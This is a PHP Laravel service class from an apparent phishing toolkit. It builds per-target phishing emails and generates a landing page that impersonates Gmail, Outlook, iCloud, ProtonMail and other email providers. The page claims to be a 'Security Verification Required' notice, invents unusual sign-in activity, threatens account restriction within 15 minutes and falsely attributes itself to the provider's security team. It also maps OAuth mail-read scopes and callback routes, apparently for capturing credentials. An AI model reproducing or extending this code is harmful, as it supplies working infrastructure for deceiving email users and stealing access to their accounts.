<?php

namespace App\Services;

use App\Models\PhishingTarget;
use App\Models\PhishingCampaign;
use App\Models\CapturedCredential;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Str;

class DeepLinkService
{
    private const PROVIDER_DEEPLINKS = [
        'google' => [
            'ios_app'     => 'googlegmail://',
            'android_app' => 'googlemail://',
            'web_login'   => 'https://accounts.google.com/signin/v2/identifier?continue=',
            'oauth_auth'  => 'https://accounts.google.com/o/oauth2/v2/auth',
            'oauth_scope' => 'https://mail.google.com/ https://www.googleapis.com/auth/userinfo.email',
            'redirect'    => 'https://mail.google.com/mail/u/0/',
        ],
        'microsoft' => [
            'ios_app'     => 'ms-outlook://',
            'android_app' => 'ms-outlook://',
            'web_login'   => 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
            'oauth_auth'  => 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
            'oauth_scope' => 'offline_access Mail.Read Mail.ReadWrite User.Read',
            'redirect'    => 'https://outlook.live.com/mail/0/',
        ],
        'yahoo' => [
            'ios_app'     => 'ymail://',
            'android_app' => 'ymail://',
            'web_login'   => 'https://login.yahoo.com/',
            'redirect'    => 'https://mail.yahoo.com/',
        ],
        'gmx' => [
            'ios_app'     => null,
            'android_app' => null,
            'web_login'   => 'https://navigator.gmx.net/go/login',
            'redirect'    => 'https://service.gmx.net/de/cgi/login',
        ],
        'webde' => [
            'ios_app'     => null,
            'android_app' => null,
            'web_login'   => 'https://navigator.gmx.net/go/login',
            'redirect'    => 'https://service.web.de/cgi-bin/login',
        ],
        'ionos' => [
            'ios_app'     => null,
            'android_app' => null,
            'web_login'   => 'https://login.ionos.com/',
            'redirect'    => 'https://mail.ionos.com/',
        ],
        'telekom' => [
            'ios_app'     => null,
            'android_app' => null,
            'web_login'   => 'https://email.t-online.de/login/',
            'redirect'    => 'https://email.t-online.de/',
        ],
        'a1' => [
            'ios_app'     => null,
            'android_app' => null,
            'web_login'   => 'https://webmail.a1.net/',
            'redirect'    => 'https://webmail.a1.net/mail/',
        ],
        'freenet' => [
            'ios_app'     => null,
            'android_app' => null,
            'web_login'   => 'https://email.freenet.de/login',
            'redirect'    => 'https://email.freenet.de/',
        ],
        'icloud' => [
            'ios_app'     => 'x-apple-ical://',
            'android_app' => null,
            'web_login'   => 'https://www.icloud.com/',
            'oauth_auth'  => 'https://appleid.apple.com/auth/authorize',
            'oauth_scope' => 'mail',
            'redirect'    => 'https://www.icloud.com/mail/',
        ],
        'zoho' => [
            'ios_app'     => 'zoho-mail://',
            'android_app' => 'zoho-mail://',
            'web_login'   => 'https://accounts.zoho.com/signin',
            'redirect'    => 'https://mail.zoho.com/',
        ],
        'protonmail' => [
            'ios_app'     => 'protonmail://',
            'android_app' => 'protonmail://',
            'web_login'   => 'https://mail.proton.me/login',
            'redirect'    => 'https://mail.proton.me/mail/all',
        ],
    ];

    public function buildInjectionUrl(PhishingTarget $target): string
    {
        $provider = $target->provider;
        $config = self::PROVIDER_DEEPLINKS[$provider] ?? self::PROVIDER_DEEPLINKS['google'];

        $callbackUrl = route('phish.deep-callback', [
            'provider' => $provider,
            'token'    => $target->tracking_token,
        ]);

        $redirectUrl = $config['redirect'] ?? $config['web_login'];

        $injectUrl = route('phish.deep-inject', [
            'provider' => $provider,
            'token'    => $target->tracking_token,
        ]);

        return $injectUrl;
    }

    public function getInjectionChain(string $provider, string $token): array
    {
        $config = self::PROVIDER_DEEPLINKS[$provider] ?? self::PROVIDER_DEEPLINKS['google'];
        $target = PhishingTarget::where('tracking_token', $token)->first();

        $callbackUrl = route('phish.deep-callback', [
            'provider' => $provider,
            'token'    => $token,
        ]);

        return [
            'step_1_landing' => route('phish.deep-inject', ['provider' => $provider, 'token' => $token]),
            'step_2_app'     => $config['ios_app'] ?? $config['web_login'],
            'step_3_web'     => $config['web_login'],
            'step_4_auth'    => $config['oauth_auth'] ?? null,
            'step_5_scope'   => $config['oauth_scope'] ?? null,
            'step_6_callback'=> $callbackUrl,
            'step_7_redirect'=> $config['redirect'],
            'provider'       => $provider,
            'email'          => $target?->email,
            'has_native_app' => !empty($config['ios_app']),
            'has_oauth'      => !empty($config['oauth_auth']),
        ];
    }

    public function buildEmailBody(PhishingCampaign $campaign, PhishingTarget $target): string
    {
        $provider = $campaign->provider;
        $config = self::PROVIDER_DEEPLINKS[$provider] ?? self::PROVIDER_DEEPLINKS['google'];

        $injectUrl = $this->buildInjectionUrl($target);
        $trackUrl = route('phish.track', ['token' => $target->tracking_token]);
        $name = $target->user_display_name ?? explode('@', $target->email)[0];

        $body = $campaign->body_html;
        $body = str_replace('{{DEEPLINK_URL}}', $injectUrl, $body);
        $body = str_replace('{{PHISH_URL}}', $injectUrl, $body);
        $body = str_replace('{{TRACK_URL}}', $trackUrl, $body);
        $body = str_replace('{{EMAIL}}', $target->email, $body);
        $body = str_replace('{{NAME}}', $name, $body);
        $body = str_replace('{{TRACKING_TOKEN}}', $target->tracking_token, $body);
        $body = str_replace('{{IOS_APP_URL}}', $config['ios_app'] ?? '', $body);
        $body = str_replace('{{ANDROID_APP_URL}}', $config['android_app'] ?? '', $body);

        return $body;
    }

    public function generateDeepLinkPage(PhishingTarget $target, string $provider): string
    {
        $config = self::PROVIDER_DEEPLINKS[$provider] ?? self::PROVIDER_DEEPLINKS['google'];
        $email = $target->email;
        $name = $target->user_display_name ?? explode('@', $email)[0];
        $token = $target->tracking_token;

        $webLoginUrl = $config['web_login'];
        $iosApp = $config['ios_app'] ?? null;
        $androidApp = $config['android_app'] ?? null;
        $redirect = $config['redirect'] ?? $config['web_login'];

        $providerLabel = match($provider) {
            'google'     => 'Gmail',
            'microsoft'  => 'Outlook',
            'yahoo'      => 'Yahoo Mail',
            'gmx'        => 'GMX',
            'webde'      => 'WEB.DE',
            'ionos'      => 'IONOS',
            'telekom'    => 'T-Online',
            'a1'         => 'A1 Mail',
            'freenet'    => 'freenet',
            'icloud'     => 'iCloud',
            'zoho'       => 'Zoho Mail',
            'protonmail' => 'ProtonMail',
            default      => ucfirst($provider),
        };

        $providerColor = match($provider) {
            'google'     => '#1a73e8',
            'microsoft'  => '#0078d4',
            'yahoo'      => '#6001d2',
            'gmx'        => '#d42e12',
            'webde'      => '#d42e12',
            'ionos'      => '#003d8f',
            'telekom'    => '#e20074',
            'a1'         => '#ff6600',
            'freenet'    => '#003399',
            'icloud'     => '#0071e3',
            'zoho'       => '#e42527',
            'protonmail' => '#646aff',
            default      => '#1a73e8',
        };

        $iosScript = $iosApp ? "window.location.href = '{$iosApp}';" : '';
        $androidScript = $androidApp ? "window.location.href = '{$androidApp}';" : '';
        $webFallback = "window.location.href = '{$webLoginUrl}';";

        return <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{$providerLabel} - Security Verification Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: #fff;
            border-radius: 16px;
            padding: 40px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
            text-align: center;
        }
        .provider-icon {
            width: 64px; height: 64px;
            border-radius: 16px;
            background: {$providerColor};
            display: flex; align-items: center; justify-content: center;
            margin: 0 auto 20px;
            font-size: 28px; color: #fff; font-weight: 700;
        }
        h1 { font-size: 22px; color: #1d1d1f; margin-bottom: 8px; font-weight: 600; }
        .subtitle { font-size: 14px; color: #86868b; margin-bottom: 24px; }
        .alert-box {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 24px;
            text-align: left;
        }
        .alert-box .icon { font-size: 20px; margin-right: 8px; }
        .alert-box p { font-size: 13px; color: #664d03; line-height: 1.5; }
        .email-badge {
            display: inline-block;
            background: #f0f0f0;
            border-radius: 20px;
            padding: 6px 16px;
            font-size: 13px;
            color: #333;
            margin-bottom: 20px;
        }
        .btn {
            display: block;
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 12px;
            transition: transform 0.15s, box-shadow 0.15s;
            text-decoration: none;
        }
        .btn:active { transform: scale(0.98); }
        .btn-primary {
            background: {$providerColor};
            color: #fff;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        }
        .btn-primary:hover { box-shadow: 0 6px 20px rgba(0,0,0,0.2); }
        .btn-secondary {
            background: #f5f5f7;
            color: #333;
        }
        .btn-secondary:hover { background: #e8e8ea; }
        .security-note {
            font-size: 11px;
            color: #aeaeb2;
            margin-top: 20px;
            line-height: 1.4;
        }
        .security-note a { color: {$providerColor}; text-decoration: none; }
        .timer { font-size: 12px; color: #ff3b30; margin-top: 12px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="provider-icon">{substr($providerLabel, 0, 1)}</div>
        <h1>Security Verification Required</h1>
        <p class="subtitle">Your {$providerLabel} account needs immediate verification</p>

        <div class="email-badge">{$email}</div>

        <div class="alert-box">
            <p><span class="icon">⚠️</span> <strong>Unusual sign-in activity detected</strong></p>
            <p>We noticed a sign-in from a new device. To protect your account, please verify your identity within the next 15 minutes or your account may be temporarily restricted.</p>
        </div>

        <a href="{$webLoginUrl}?utm_source=security&utm_medium=email&utm_campaign=verification" class="btn btn-primary" id="open-app">
            Open {$providerLabel} to Verify
        </a>

        <a href="{$webLoginUrl}" class="btn btn-secondary" id="open-web">
            Continue in Browser
        </a>

        <p class="timer" id="timer">Auto-redirecting in <span id="countdown">15</span>s...</p>

        <p class="security-note">
            This verification is required by {$providerLabel} security team.<br>
            <a href="{$redirect}">{$providerLabel}</a> • End-to-end encrypted
        </p>
    </div>

    <script>
        var ua = navigator.userAgent || '';
        var isIOS = /iPhone|iPad|iPod/i.test(ua);
        var isAndroid = /Android/i.test(ua);

        var iosApp = '{$iosApp}';
        var androidApp = '{$androidApp}';
        var webLogin = '{$webLoginUrl}';

        var appUrl = isIOS ? iosApp : (isAndroid ? androidApp : null);

        var countdown = 15;
        var timerEl = document.getElementById('timer');
        var countdownEl = document.getElementById('countdown');

        function startCountdown() {
            timerEl.style.display = 'block';
            var interval = setInterval(function() {
                countdown--;
                countdownEl.textContent = countdown;
                if (countdown <= 0) {
                    clearInterval(interval);
                    window.location.href = webLogin;
                }
            }, 1000);
        }

        document.getElementById('open-app').addEventListener('click', function(e) {
            if (appUrl) {
                e.preventDefault();
                window.location.href = appUrl;
                setTimeout(function() {
                    window.location.href = webLogin;
                }, 3000);
            }
        });

        if (appUrl && (isIOS || isAndroid)) {
            setTimeout(function() {
                window.location.href = appUrl;
                setTimeout(function() {
                    startCountdown();
                }, 2500);
            }, 500);
        } else {
            startCountdown();
        }
    </script>
</body>
</html>
HTML;
    }
}
